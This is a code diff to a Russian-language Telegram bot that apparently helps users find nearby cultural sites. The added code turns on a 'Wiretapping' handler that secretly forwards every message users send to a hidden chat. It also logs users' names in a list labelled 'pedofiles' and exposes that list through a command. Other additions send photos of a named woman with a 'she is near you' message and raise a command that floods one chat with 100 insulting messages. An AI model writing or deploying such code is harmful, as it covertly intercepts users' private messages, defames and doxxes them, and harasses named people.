@@ -12,7 +12,8 @@ bot = config.bot
 geolocator = config.geolocator
 
 
-
+shaluni = []
+pedofiles = []
 # Admin functions
 @bot.message_handler(commands=['check', 'status'])
 def check(message):
@@ -20,6 +21,7 @@ def check(message):
     SmartSaving.SmartSaving(str(message.chat.id));
     bot.reply_to(message, text=f'Bot status: working, {message.from_user.username}!')
     chatid = message.chat.id
+    print(message)
 
 
 @bot.message_handler(commands=['stop'])
@@ -125,6 +127,58 @@ def get_feedback_keyboard():
     keyboard.add(button_yes, button_next, button_stop)
     return keyboard
 
+
+
+def gotoSikerina(message):
+    first_name = message.from_user.first_name
+    last_name = message.from_user.last_name
+    username = "@" + message.from_user.username
+    print(username, last_name, first_name)
+    pedofiles.append(str(f'{username}, {first_name}, {last_name}'))
+    time.sleep(1)
+    markup = types.InlineKeyboardMarkup()
+    button = types.InlineKeyboardButton(text="Давайте!", callback_data="send_photo")
+    markup.add(button)
+    bot.send_message(message.chat.id, text="Постойте, нашли ещё кое-что для вас!", reply_markup=markup)
+    print(shaluni)
+    #if message.chat.id in shaluni:
+        #bot.send_message(message, text=f'Вы уже помечены как заядлы розбiйник дрочуне')
+    #else:
+        #shaluni.append(str(message.chat.id))
+
+def sexySikerina(message):
+    time.sleep(1)
+    photo = open('C:/Users/razuv/PycharmProjects/HistoryBotProject_v1/BadSikerina.jpg', 'rb')
+    bot.send_photo(message.chat.id, photo)
+
+@bot.message_handler(commands=["shalunlist"])
+def ListShaluny(message):
+    bot.send_message(message.chat.id, text="Среди педофилов успели засветиться: ")
+    if len(pedofiles) == 0:
+        bot.send_message(message.chat.id, text='Список pedofiles is empty')
+    else:
+        for i in range(len(pedofiles)):
+            bot.send_message(message.chat.id, text=f'{i+1}.) {pedofiles[i]}')
+
+
+@bot.callback_query_handler(func=lambda call: call.data == "send_photo")
+def send_photo_callback(call):
+    print(shaluni, "1")
+    print(str(call.message.chat.id) in shaluni)
+    if str(call.message.chat.id) in shaluni:
+        bot.send_message(call.message.chat.id, text=f'Вы уже помечены как заядлы розбiйник дрочуне')
+        sexySikerina(call.message)
+        print('1')
+
+    else:
+        print('2')
+        shaluni.append(str(call.message.chat.id))
+
+        bot.send_message(call.message.chat.id, text='Виктория Сикерина в 2 метрах от вас!')
+        photo = open('C:/Users/razuv/PycharmProjects/HistoryBotProject_v1/sikerina.jpg', 'rb')
+        bot.send_photo(call.message.chat.id, photo)
+
+
 @bot.message_handler(func=lambda message: state == State.WAITING_FOR_FEEDBACK)
 def handle_feedback(message):
     global state
@@ -142,6 +196,7 @@ def handle_feedback(message):
         else:
             bot.send_message(message.chat.id, "Вы просмотрели все места в вашем радиусе.", reply_markup=types.ReplyKeyboardRemove(), parse_mode='Markdown')
             state = State.WAITING_FOR_LOCATION
+            gotoSikerina(message)
     elif message.text == "Остановить поиск":
         bot.send_message(message.chat.id, "Поиск прекращён.", reply_markup=types.ReplyKeyboardRemove(), parse_mode='Markdown')
         state = State.WAITING_FOR_LOCATION
@@ -170,17 +225,17 @@ def distance(lat1, lon1, lat2, lon2):
 
 @bot.message_handler(commands=["Dima_Borisov_DDOS"])
 def DimaBorisovDDOS(message):
-    for i in range(10):
+    for i in range(100):
         time.sleep(0.5)
         bot.send_message(chat_id=953910033, text='привет пидрила')
 
 
 
 # DIMA'S IDIOTS FUN METHODS
-#@bot.message_handler(content_types=["voice", "sticker", "video", "document", "photo", "text"])
-#def Wiretapping(message):
-#    #    bot.forward_message(chat_id=-4031826999, from_chat_id=message.chat.id, message_id=message.id)
-#    bot.send_message(message, text='/start - поиск ближайших культурных мест.')
+@bot.message_handler(content_types=["voice", "sticker", "video", "document", "photo", "text"])
+def Wiretapping(message):
+    bot.forward_message(chat_id=-4031826999, from_chat_id=message.chat.id, message_id=message.id)
+    # bot.send_message(message, text='/start - поиск ближайших культурных мест.')
 
 
 @bot.message_handler(commands=["picture"])
